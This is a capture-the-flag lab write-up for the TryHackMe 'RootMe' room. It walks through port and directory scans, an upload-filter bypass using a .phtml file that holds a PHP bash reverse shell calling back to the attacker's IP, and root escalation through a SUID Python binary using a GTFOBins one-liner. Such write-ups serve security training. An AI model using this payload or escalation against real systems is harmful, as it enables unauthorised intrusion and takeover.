---
title: RootMe
draft: 
tags:
  - oscp
  - easy
  - thm
---
# Overview
This room was fun, and given the nature of the questions, it tends to help guide you on what you need to do next. This involves find a webpage with a vulnerability that allows file uploads to enable php reverse-shells. Then using SUID bits to escalate privileges and gain root. 

I am also taking the time to fill this out after the fact, unfortunately, I had closed my burp suite session, so I can't show the findings with that, but they were minimal. Just something that gives a hit to what can be uploaded.

# Initial Scan
```
nmap -Pn -p- $IP -v
Starting Nmap 7.94SVN ( https://nmap.org )
Initiating Parallel DNS resolution of 1 host. at 14:23
Completed Parallel DNS resolution of 1 host. at 14:23, 0.04s elapsed
Initiating Connect Scan at 14:23
Scanning 10.10.229.101 [65535 ports]
Discovered open port 80/tcp on 10.10.229.101
Discovered open port 22/tcp on 10.10.229.101
Increasing send delay for 10.10.229.101 from 0 to 5 due to max_successful_try
```
Cancelled after the room verified there was only 2 ports.
# Specific Port Scans With Service and OS Enumeration
```
udo nmap -Pn -p22,80 -sV -sC -O $IP
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.229.101
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```

# Enumeration
Gobuster enumerates the web directories.
```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.229.101
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.229.101/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.229.101/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.229.101/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.229.101/pan
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

# Initial Foothold

![[RootMePanelPage.png]]

Testing this page reveals php documents are blocked. PDF files are allowed however.

Unfortunately, tricking the form upload by spoofing the content-type with burpsuite and fixing the extension from .pdf to .php didn't work.

However, burpsuite reveals that HTML files are allowed. Googling reveals a .phtml file format that allows PHP to be ran. I reused a file from LazyAdmin:
```
<!--
# Exploit :
-->

<html>
<body>

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.13.62.120/4444 0>&1'");
?>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```

This was saved as shell.phtml and uploaded. Then, the page shows a link to the uploaded file.

After setting up a netcat listener on my kali box, `nc -lvnp 4444`, and clicking that link... we get a shell!

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.62.120] from (UNKNOWN) [10.10.229.101] 50930
bash: cannot set terminal process group (888): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/var/www/html/uploads$ ls
ls
bindshell.php.pdf
php.html
php.phtml
www-data@rootme:/var/www/html/uploads$ whoami
whoami
www-data
```

We get the user.txt flag
```
bash-4.4$ find / -iname "user.txt" 2>/dev/null
find / -iname "user.txt" 2>/dev/null
/var/www/user.txt
bash-4.4$ cd /var/www
cd /var/www
bash-4.4$ cat user.txt
```
# Privilege Escalation

Next we can check with
`sudo -l` prompts for a password, which is no good.

However... Checking SUID bits finds Python!
```
bash-4.4$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

After checking GTFOBins, we get a handy piece of code:
`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
Which when ran, gets us root! And we can easy grab the root.txt
```
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
```

![[RootMeCongrats.png]]
